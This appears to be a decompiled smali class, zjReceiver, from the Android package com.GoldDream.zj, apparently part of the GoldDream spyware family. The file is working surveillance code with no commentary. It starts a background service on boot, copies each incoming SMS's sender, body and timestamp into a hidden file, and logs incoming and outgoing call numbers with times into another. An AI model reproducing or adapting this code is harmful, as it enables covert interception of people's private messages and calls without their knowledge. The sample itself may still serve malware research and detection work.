.class public Lcom/GoldDream/zj/zjReceiver;
.super Landroid/content/BroadcastReceiver;
.source "zjReceiver.java"


# static fields
.field private static final ACTION_BOOT:Ljava/lang/String; = "android.intent.action.BOOT_COMPLETED"

.field private static final PHONECALL_FILE_NAME:Ljava/lang/String; = "zjphonecall.txt"

.field private static final SMS_FILE_NAME:Ljava/lang/String; = "zjsms.txt"

.field private static final SMS_RECEIVED:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field private static income_phoneNumber:Ljava/lang/String;

.field private static incomingFlag:Ljava/lang/Boolean;


# instance fields
.field private outcall_phoneNumber:Ljava/lang/String;

.field private sms_body:Ljava/lang/String;

.field private sms_code:Ljava/lang/String;

.field private sms_time:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 25
    const-string v0, ""

    sput-object v0, Lcom/GoldDream/zj/zjReceiver;->income_phoneNumber:Ljava/lang/String;

    .line 27
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/GoldDream/zj/zjReceiver;->incomingFlag:Ljava/lang/Boolean;

    .line 19
    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    const-string v1, ""

    .line 19
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 22
    const-string v0, ""

    iput-object v1, p0, Lcom/GoldDream/zj/zjReceiver;->sms_code:Ljava/lang/String;

    .line 23
    const-string v0, ""

    iput-object v1, p0, Lcom/GoldDream/zj/zjReceiver;->sms_body:Ljava/lang/String;

    .line 24
    const-string v0, ""

    iput-object v1, p0, Lcom/GoldDream/zj/zjReceiver;->sms_time:Ljava/lang/String;

    .line 26
    const-string v0, ""

    iput-object v1, p0, Lcom/GoldDream/zj/zjReceiver;->outcall_phoneNumber:Ljava/lang/String;

    .line 19
    return-void
.end method

.method private WriteRec(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "filename"    # Ljava/lang/String;
    .param p3, "info"    # Ljava/lang/String;

    .prologue
    .line 102
    const v2, 0x8000

    :try_start_0
    invoke-virtual {p1, p2, v2}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    .line 103
    .local v1, "fos":Ljava/io/FileOutputStream;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "\r\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/FileOutputStream;->write([B)V

    .line 104
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 113
    .end local v1    # "fos":Ljava/io/FileOutputStream;
    :goto_0
    return-void

    .line 105
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 107
    .local v0, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    .line 109
    .end local v0    # "e":Ljava/io/FileNotFoundException;
    :catch_1
    move-exception v2

    move-object v0, v2

    .line 111
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private getSystemTime()Ljava/lang/String;
    .locals 5

    .prologue
    .line 115
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v4, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v0, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 116
    .local v0, "df":Ljava/text/SimpleDateFormat;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    .line 117
    .local v2, "nowTime":J
    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 118
    .local v1, "nowDateTime":Ljava/lang/String;
    return-object v1
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 34
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v11

    const-string v12, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {v11, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_1

    .line 35
    new-instance v1, Landroid/content/Intent;

    const-string v11, "android.intent.action.RUN"

    invoke-direct {v1, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 36
    .local v1, "i":Landroid/content/Intent;
    const-class v11, Lcom/GoldDream/zj/zjService;

    invoke-virtual {v1, p1, v11}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 37
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 98
    .end local v1    # "i":Landroid/content/Intent;
    .end local p2    # "intent":Landroid/content/Intent;
    :cond_0
    :goto_0
    return-void

    .line 40
    .restart local p2    # "intent":Landroid/content/Intent;
    :cond_1
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v11

    const-string v12, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v11, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_2

    .line 42
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 43
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_0

    .line 44
    const-string v11, "pdus"

    invoke-virtual {v0, v11}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, [Ljava/lang/Object;

    .line 45
    .local v5, "pdus":[Ljava/lang/Object;
    array-length v11, v5

    new-array v3, v11, [Landroid/telephony/SmsMessage;

    .line 46
    .local v3, "messages":[Landroid/telephony/SmsMessage;
    const/4 v1, 0x0

    .end local p2    # "intent":Landroid/content/Intent;
    .local v1, "i":I
    :goto_1
    array-length v11, v5

    if-ge v1, v11, :cond_0

    .line 47
    aget-object p2, v5, v1

    check-cast p2, [B

    invoke-static {p2}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v11

    aput-object v11, v3, v1

    .line 48
    aget-object v11, v3, v1

    invoke-virtual {v11}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v11

    iput-object v11, p0, Lcom/GoldDream/zj/zjReceiver;->sms_code:Ljava/lang/String;

    .line 49
    aget-object v11, v3, v1

    invoke-virtual {v11}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v11

    iput-object v11, p0, Lcom/GoldDream/zj/zjReceiver;->sms_body:Ljava/lang/String;

    .line 50
    new-instance v8, Ljava/sql/Date;

    aget-object v11, v3, v1

    invoke-virtual {v11}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v11

    invoke-direct {v8, v11, v12}, Ljava/sql/Date;-><init>(J)V

    .line 51
    .local v8, "smsDate":Ljava/sql/Date;
    new-instance v7, Ljava/text/SimpleDateFormat;

    const-string v11, "yyyy-MM-dd HH:mm:ss"

    invoke-direct {v7, v11}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 52
    .local v7, "simpleDateFormat":Ljava/text/SimpleDateFormat;
    invoke-virtual {v7, v8}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v6

    .line 53
    .local v6, "sendDate":Ljava/lang/String;
    iput-object v6, p0, Lcom/GoldDream/zj/zjReceiver;->sms_time:Ljava/lang/String;

    .line 54
    new-instance v11, Ljava/lang/StringBuilder;

    iget-object v12, p0, Lcom/GoldDream/zj/zjReceiver;->sms_code:Ljava/lang/String;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v12, "#"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    iget-object v12, p0, Lcom/GoldDream/zj/zjReceiver;->sms_body:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "#"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    iget-object v12, p0, Lcom/GoldDream/zj/zjReceiver;->sms_time:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 55
    .local v10, "tmpSms":Ljava/lang/String;
    const-string v11, "zjsms.txt"

    invoke-direct {p0, p1, v11, v10}, Lcom/GoldDream/zj/zjReceiver;->WriteRec(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 46
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 60
    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v1    # "i":I
    .end local v3    # "messages":[Landroid/telephony/SmsMessage;
    .end local v5    # "pdus":[Ljava/lang/Object;
    .end local v6    # "sendDate":Ljava/lang/String;
    .end local v7    # "simpleDateFormat":Ljava/text/SimpleDateFormat;
    .end local v8    # "smsDate":Ljava/sql/Date;
    .end local v10    # "tmpSms":Ljava/lang/String;
    .restart local p2    # "intent":Landroid/content/Intent;
    :cond_2
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v11

    const-string v12, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v11, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_3

    .line 61
    const/4 v11, 0x0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    sput-object v11, Lcom/GoldDream/zj/zjReceiver;->incomingFlag:Ljava/lang/Boolean;

    .line 62
    const-string v11, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {p2, v11}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    iput-object v11, p0, Lcom/GoldDream/zj/zjReceiver;->outcall_phoneNumber:Ljava/lang/String;

    .line 64
    invoke-direct {p0}, Lcom/GoldDream/zj/zjReceiver;->getSystemTime()Ljava/lang/String;

    move-result-object v4

    .line 65
    .local v4, "nowTime":Ljava/lang/String;
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "OUT#"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v12, p0, Lcom/GoldDream/zj/zjReceiver;->outcall_phoneNumber:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "#"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 66
    .local v2, "inputStr":Ljava/lang/String;
    const-string v11, "zjphonecall.txt"

    invoke-direct {p0, p1, v11, v2}, Lcom/GoldDream/zj/zjReceiver;->WriteRec(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 69
    .end local v2    # "inputStr":Ljava/lang/String;
    .end local v4    # "nowTime":Ljava/lang/String;
    :cond_3
    const-string v11, "phone"

    invoke-virtual {p1, v11}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 70
    .local v9, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getCallState()I

    move-result v11

    packed-switch v11, :pswitch_data_0

    goto/16 :goto_0

    .line 86
    :pswitch_0
    sget-object v11, Lcom/GoldDream/zj/zjReceiver;->incomingFlag:Ljava/lang/Boolean;

    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v11

    if-eqz v11, :cond_0

    .line 88
    invoke-direct {p0}, Lcom/GoldDream/zj/zjReceiver;->getSystemTime()Ljava/lang/String;

    move-result-object v4

    .line 89
    .restart local v4    # "nowTime":Ljava/lang/String;
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "IN_END#"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v12, Lcom/GoldDream/zj/zjReceiver;->income_phoneNumber:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "#"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 90
    .restart local v2    # "inputStr":Ljava/lang/String;
    const-string v11, "zjphonecall.txt"

    invoke-direct {p0, p1, v11, v2}, Lcom/GoldDream/zj/zjReceiver;->WriteRec(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 72
    .end local v2    # "inputStr":Ljava/lang/String;
    .end local v4    # "nowTime":Ljava/lang/String;
    :pswitch_1
    const/4 v11, 0x1

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    sput-object v11, Lcom/GoldDream/zj/zjReceiver;->incomingFlag:Ljava/lang/Boolean;

    .line 73
    const-string v11, "incoming_number"

    invoke-virtual {p2, v11}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    sput-object v11, Lcom/GoldDream/zj/zjReceiver;->income_phoneNumber:Ljava/lang/String;

    goto/16 :goto_0

    .line 77
    :pswitch_2
    sget-object v11, Lcom/GoldDream/zj/zjReceiver;->incomingFlag:Ljava/lang/Boolean;

    invoke-virtual {v11}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v11

    if-eqz v11, :cond_0

    .line 79
    invoke-direct {p0}, Lcom/GoldDream/zj/zjReceiver;->getSystemTime()Ljava/lang/String;

    move-result-object v4

    .line 80
    .restart local v4    # "nowTime":Ljava/lang/String;
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "IN_BEGIN#"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v12, Lcom/GoldDream/zj/zjReceiver;->income_phoneNumber:Ljava/lang/String;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "#"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 81
    .restart local v2    # "inputStr":Ljava/lang/String;
    const-string v11, "zjphonecall.txt"

    invoke-direct {p0, p1, v11, v2}, Lcom/GoldDream/zj/zjReceiver;->WriteRec(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 70
    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method
